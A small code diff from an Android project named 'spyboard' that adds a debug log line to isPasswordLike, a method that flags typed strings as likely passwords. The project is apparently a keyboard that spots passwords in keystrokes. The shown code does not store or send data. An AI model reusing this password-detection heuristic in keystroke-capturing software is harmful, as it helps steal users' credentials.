@@ -1,5 +1,7 @@
 package com.idankorenisraeli.spyboard.input;
 
+import android.util.Log;
+
 /**
  * By using this class we will convert english characters to hebrew
  */
@@ -21,8 +23,10 @@ public class KeycodeDictionary {
     public boolean isPasswordLike(String str){
         if(str.toUpperCase().equals(str.toLowerCase()))
             return false; //no upper and lower case in the same word
-        if(!str.matches(".*\\d.*"))
+        if(!str.matches(".*\\d.*")) {
+            Log.i("pttt", "REGEX");
             return false; //string includes upper, lower, digits
+        }
         return str.length() > 5; // String contains upper case char, lower case chars, and number, at least 6 chars
     }
 
